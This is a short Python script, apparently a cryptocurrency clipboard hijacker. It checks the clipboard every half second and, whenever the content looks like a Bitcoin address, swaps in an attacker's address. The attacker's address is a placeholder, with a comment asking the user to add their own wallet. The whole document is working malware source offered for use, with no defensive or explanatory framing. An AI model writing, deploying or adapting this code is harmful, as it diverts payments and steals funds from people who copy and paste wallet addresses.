#! /usr/bin/env python
import time, re, pyperclip

ATTACKER_ADDR = "1FakeBtcAddressDontUse123"  #add your wallet here
btc_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')

while True:
    data = pyperclip.paste()
    if btc_pattern.match(data):
        pyperclip.copy(ATTACKER_ADDR)
    time.sleep(0.5)
